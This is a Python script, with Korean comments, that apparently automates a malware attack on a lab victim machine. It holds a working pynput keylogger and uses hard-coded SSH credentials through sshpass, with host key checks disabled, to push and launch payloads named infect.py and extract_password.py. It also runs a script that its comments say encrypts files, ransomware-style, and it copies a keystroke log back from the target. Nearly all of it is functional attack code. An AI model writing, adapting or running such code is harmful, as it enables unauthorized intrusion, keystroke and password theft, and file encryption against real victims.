#!/usr/bin/env python3
import subprocess
import os
import time
from threading import Thread
from pynput import keyboard

TARGET_IP = "192.168.56.102"  # 원격 타겟 IP
USER = "ubuntu-victim2"       # 타겟 사용자 계정
PASSWORD = "nct127"           # 타겟 비밀번호
REMOTE_DIR = "/home/ubuntu-victim2/gui_test1"  # 원격 경로
LOG_PATH = "/tmp/logs.txt"    # 키로거 로그 경로
LOCAL_FILES = [               # 전송할 파일 목록
    "gui_test1.py",
    "img/app_icon.ico",
    "img/app_icon.xbm",
    "img/logo.png",
    "img/thank-you.png",
    "your_script.py",
    "infect.py",
    "extract_password.py"
]

class RemoteExecutor:
    """원격 명령 및 파일 전송 관리 클래스"""
    def __init__(self, target_ip, user, password):
        self.target_ip = target_ip
        self.user = user
        self.password = password

    def run_ssh(self, command, use_sudo=False):
        """원격 SSH 명령 실행"""
        if use_sudo:
            command = f"echo '{PASSWORD}' | sudo -S -- sh -c '{command}'"
        result = subprocess.run([
            "sshpass", "-p", self.password,
            "ssh", "-o", "StrictHostKeyChecking=no",
            f"{self.user}@{self.target_ip}", command
        ])
        if result.returncode != 0:
            print(f"[!] SSH 명령 실패: {command}")
        return result

    def run_scp(self, local_path, remote_path, reverse=False):
        """SCP를 통한 파일 전송 또는 수신"""
        cmd = [
            "sshpass", "-p", self.password,
            "scp", "-o", "StrictHostKeyChecking=no"
        ]
        if reverse:
            cmd.extend([remote_path, local_path])
        else:
            cmd.extend([local_path, remote_path])
        result = subprocess.run(cmd)
        if result.returncode != 0:
            print(f"[!] SCP 명령 실패: {local_path} -> {remote_path}")
        return result

class Keylogger:
    """키로거 관리 클래스"""
    def __init__(self, log_path):
        self.log_path = log_path

    def start(self):
        """키로거 시작"""
        def on_press(key):
            with open(self.log_path, "a") as f:
                f.write(f"{key.char}" if hasattr(key, 'char') and key.char else f"[{key}]")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

class FileManager:
    """로컬 및 원격 파일 관리 클래스"""
    def __init__(self, local_files, remote_executor, remote_dir):
        self.local_files = local_files
        self.remote_executor = remote_executor
        self.remote_dir = remote_dir

    def setup_remote_directory(self):
        """원격 디렉토리 생성"""
        self.remote_executor.run_ssh(f"mkdir -p {self.remote_dir}/img")

    def transfer_files(self):
        """파일 전송"""
        for file in self.local_files:
            if not os.path.exists(file):
                print(f"[!] 파일 누락: {file} (전송 생략)")
                continue
            remote_path = f"{self.remote_executor.user}@{self.remote_executor.target_ip}:{self.remote_dir}/{file}"
            self.remote_executor.run_scp(file, remote_path)

class AttackManager:
    """전체 공격 관리 클래스"""
    def __init__(self):
        self.remote_executor = RemoteExecutor(TARGET_IP, USER, PASSWORD)
        self.keylogger = Keylogger(LOG_PATH)
        self.file_manager = FileManager(LOCAL_FILES, self.remote_executor, REMOTE_DIR)

    def execute_attack(self):
        """공격 실행"""
        print("[+] 키로거 시작...")
        self.keylogger.start()

        print("[+] 원격 디렉토리 설정...")
        self.file_manager.setup_remote_directory()

        print("[+] 파일 전송...")
        self.file_manager.transfer_files()

        print("[+] 종속성 설치...")
        install_cmd = (
            "apt update -y && "
            "apt install -y python3-pip python3-tk python3-pil.imagetk && "
            "python3 -m pip install pycryptodome pynput"
        )
        self.remote_executor.run_ssh(install_cmd, use_sudo=True)

        print("[+] infect.py 실행...")
        self.remote_executor.run_ssh(f"DISPLAY=:0 nohup python3 {REMOTE_DIR}/infect.py > /tmp/infect_log.txt 2>&1 &")

        print("[+] 파일 암호화 실행...")
        self.remote_executor.run_ssh(f"python3 {REMOTE_DIR}/your_script.py")

        print("[+] 키로거 로그 다운로드 중...")
        time.sleep(60)  # 60초 대기
        self.remote_executor.run_scp("./logs.txt", f"{USER}@{TARGET_IP}:/tmp/logs.txt", reverse=True)

        print("[✓] 모든 작업 완료!")

# ───────────── 실행부 ─────────────
if __name__ == "__main__":
    manager = AttackManager()
    manager.execute_attack()
